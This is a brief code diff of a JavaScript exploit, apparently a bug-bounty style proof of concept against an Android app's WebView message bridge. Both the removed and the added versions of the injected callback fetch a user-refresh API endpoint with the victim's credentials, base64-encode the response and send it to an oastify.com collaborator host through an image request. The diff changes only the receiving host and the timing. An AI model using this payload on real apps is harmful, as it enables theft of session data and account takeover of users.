@@ -7,13 +7,12 @@ window.onload = function() {
       AndroidMessageHandler.postMessage(JSON.stringify({
         command: "open-native-url",
         url: "kolonialno://cart",
-        callbackString:
-"setTimeout(function(){fetch('/api/v1/user/refresh',{credentials:'include'})"
-+ ".then(r=>r.text())"
-+ ".then(d=>{new Image().src='https://li767otz916pqwf469g7fzfqhhn8b2zr.oastify.com/leak?data='+btoa(d);});},1000);"
+        callbackString: "fetch('/api/v1/user/refresh',{credentials:'include'})"
+          + ".then(r=>r.text())"
+          + ".then(d=>{new Image().src='https://gbv10jmu2wzkjr8zz4928u8lacg34ysn.oastify.com/leak?data='+btoa(d);});"
       }));
     } else {
-      setTimeout(trigger, 500); // retry sampai ready
+      setTimeout(trigger, 5000); // retry sampai ready
     }
   }
   trigger();
